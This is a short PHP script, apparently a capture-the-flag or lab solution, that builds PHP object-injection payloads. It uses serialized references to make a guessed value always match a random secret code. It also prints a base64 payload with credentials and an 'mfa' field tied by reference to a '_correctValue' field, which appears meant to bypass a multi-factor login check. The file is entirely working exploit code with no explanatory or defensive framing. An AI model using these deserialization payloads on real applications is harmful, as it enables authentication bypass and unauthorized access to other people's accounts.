<?php
class Object1
{
  var $guess;
  var $secretCode;
}

#$obj = unserialize('O:7:"Object1":2:{s:10:"secretCode";s:5:"guess";}');
$obj = unserialize('O:7:"Object1":2:{s:10:"secretCode";N;s:5:"guess";R:2;}');
$obj1 = new Object1;

$obj2 = base64_encode('O:8:"stdClass":4:{s:8:"username";s:11:"D0loresH4ze";s:8:"password";s:13:"rasmuslerdorf";s:3:"mfa";N;s:13:"_correctValue";R:4;}');

var_dump(serialize($obj));
echo "";
var_dump(serialize($obj1));
echo "";
var_dump($obj2);

if($obj) {
    $obj->secretCode = rand(500000,999999);
    if($obj->guess === $obj->secretCode) {
        echo "Win";
    }
}
?>
